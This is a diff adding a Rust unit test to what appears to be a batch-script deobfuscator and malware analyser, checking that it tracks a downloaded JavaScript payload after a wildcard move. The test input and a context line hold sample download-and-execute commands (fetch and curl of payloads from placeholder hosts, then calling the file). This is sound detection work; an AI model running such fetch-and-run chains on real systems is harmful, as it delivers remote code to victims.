@@ -26646,6 +26646,31 @@ call C:\Temp\original.js"#,
     }
 
     #[test]
+    fn move_wildcard_source_preserves_generated_script_content_and_removes_source() {
+        let report = crate::analyze(
+            br#"echo fetch('https://move-wildcard-dir.example/payload') > C:\Work\original.js
+move /y C:\Work\*.js C:\Temp\
+if not exist C:\Work\original.js set MARK=moved
+call C:\Temp\original.js
+echo %MARK%"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src == "https://move-wildcard-dir.example/payload")
+            }),
+            "move wildcard source did not preserve generated JS content: {:?}",
+            report.traits
+        );
+        assert!(
+            report.deobfuscated.contains("echo moved"),
+            "move wildcard source did not remove original tracked source:\n{}\ntraits={:?}",
+            report.deobfuscated,
+            report.traits
+        );
+    }
+
+    #[test]
     fn ren_preserves_download_source_for_later_execution() {
         let report = crate::analyze(
             br#"curl -o original.hta https://ren-download.example/payload.hta
